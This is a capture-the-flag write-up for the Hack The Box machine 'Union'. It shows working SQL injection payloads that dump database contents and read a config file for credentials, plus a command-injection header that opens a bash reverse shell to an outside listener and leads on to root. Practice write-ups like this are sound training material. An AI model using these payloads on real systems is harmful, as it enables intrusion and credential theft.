---
title: "HTB Union"
permalink: /writeups/union
location: default
---

# HTB Union

**Machine Information**

	IP : 10.10.11.128
	OS : Linux

### Reconnaissance

**Rustscan**

Start by running a port scan using `rustscan`. 

```
rustscan -a 10.10.11.128 -- -sC -sV
```

This should only reveal one open port: `80`.

```
PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-methods: 
|_  Supported Methods: GET HEAD POST
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Getting a Foothold

**Directory Scan**

Check for directories by running `dirsearch`.

```
dirsearch -u http://10.10.11.128
```

This will reveal a `/config.php` file but we are unable to access it at the moment.

```
[20:38:34] 200 -    0B  - /config.php
```

**Manual Enumeration**

If we go to the main page we will be greeted with a "Player Eligibility Check" input.

<http://10.10.11.128/>

If we enter the following string `' -- -` it is returned in the response.

```
Congratulations ' -- - you may compete in this tournament!
```

This indicates that it may be vulnerable to SQL injection. If we click the link that appears it will head to the following endpoint:

<http://10.10.11.128/challenge.php>

The form asks for the "The First Flag" so we will need to come back later.

**SQL Injection**

Given that the machine is called UNION that is a big hint so we can try a UNION command.

```
' union select schema_name from information_schema.schemata-- -
```

This returns a new different error message. It also selects `mysql` as the player name in the response.

> Sorry, mysql you are not eligible due to already qualifying.

We can modify this command slightly to return the rest of the tables.

```
' union select group_concat(schema_name) from information_schema.schemata-- -
```

The response shows five tables including `mysql`, `information_schema`, `performance_schema`, `sys`, and `november`.

> Sorry, mysql,information_schema,performance_schema,sys,november you are not eligible due to already qualifying.

From the output the only non-standard table is `november` so we can start there. We can modify the payload to retrieve the table and column names.

```
' union select group_concat(table_name,column_name) from information_schema.columns where table_schema like 'november'-- -
```

The output is a bit messy but it should be `flag:one` and `players:player`.

> Sorry, flagone,playersplayer you are not eligible due to already qualifying.

If we modify the SQL injection payload to the following it should dump the flag table.

```
' union select one from november.flag-- -
```

This will reveal a flag. Head back the challenge page that was asking for a flag to be submitted.

<http://10.10.11.128/challenge.php>

After submitting the flag we get the following message indicating we have SSH access now:

> Welcome Back!
> 
> Your IP Address has now been granted SSH Access.

**Dump Credentials**

We can confirm this with a port scan.

```
nmap -p 22 10.10.11.128
```

Port 22 is now open but we do not have credentials yet.

```
PORT   STATE SERVICE
22/tcp open  ssh
```

We can take a look at the `config.php` we found earlier to see if we can access it using our SQL injection vulnerability. Modify the payload to the following:

```
' union select load_file('/var/www/html/config.php') -- -
```

This won't be displayed on the web page but if we check the request in Burp Suite it reveals credentials for the user `uhc`.

**SSH**

We can try to login with the credentials from the `config.php` file.

```
ssh uhc@10.10.11.128
```

Success! Grab the user flag from the following directory:

```
/home/uhc/user.txt
```

### Privilege Escalation

Inspecting the `firewall.php` page that was used to whitelist our IP address contains a block of vulnerable code that can be exploited.

```php
<?php
  if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
  } else {
    $ip = $_SERVER['REMOTE_ADDR'];
  };
  system("sudo /usr/sbin/iptables -A INPUT -s " . $ip . " -j ACCEPT");
?>
```

We can exploit this by adding an additional header to our web request. Inspect the request to `firewall.php` in Burp Suite and add the following header:

```
X-FORWARDED-FOR: ;bash -c "bash -i >& /dev/tcp/10.10.14.4/9001 0>&1";
```

Start a new `netcat` listener and send the request to get a reverse shell. Success!

```
www-data@union:~/html$ whoami
www-data
```

Check the users `sudo` privileges with `sudo -l` to see that they can run any `sudo` command without a password.

```
(ALL : ALL) NOPASSWD: ALL
```

Switch to the root user.

```
sudo su - root
```

The flag can be found in the following directory:

```
/root/root.txt
```
